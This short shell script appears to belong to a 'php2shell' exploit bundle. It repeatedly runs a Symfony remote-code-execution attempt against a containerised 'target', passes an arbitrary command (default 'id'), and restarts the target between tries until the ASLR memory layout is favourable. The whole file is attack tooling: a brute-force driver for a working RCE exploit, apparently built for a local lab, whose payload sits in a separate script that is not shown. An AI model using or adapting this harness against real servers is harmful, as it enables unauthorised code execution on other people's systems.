#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
compose="$bundle_dir/scripts/symfony-compose-command.sh"
max_attempts=${MAX_ATTEMPTS:-8}
command=${*:-id}
host_port=${PHP2SHELL_SYMFONY_HOST_PORT:-9093}
export PHP2SHELL_SYMFONY_HOST_PORT="$host_port"

case "$max_attempts" in
    *[!0-9]*|'') echo "Invalid MAX_ATTEMPTS: $max_attempts" >&2; exit 2 ;;
esac
[ "$max_attempts" -gt 0 ] || { echo "MAX_ATTEMPTS must be positive" >&2; exit 2; }

attempt=1
while [ "$attempt" -le "$max_attempts" ]; do
    printf 'Symfony RCE attempt %s/%s\n' "$attempt" "$max_attempts"
    if "$bundle_dir/scripts/symfony-test.sh" "$command"; then
        exit 0
    fi
    if [ "$attempt" -lt "$max_attempts" ]; then
        "$compose" restart target
        sleep 2
    fi
    attempt=$((attempt + 1))
done

echo "No favorable native ASLR layout after $max_attempts attempts." >&2
exit 1
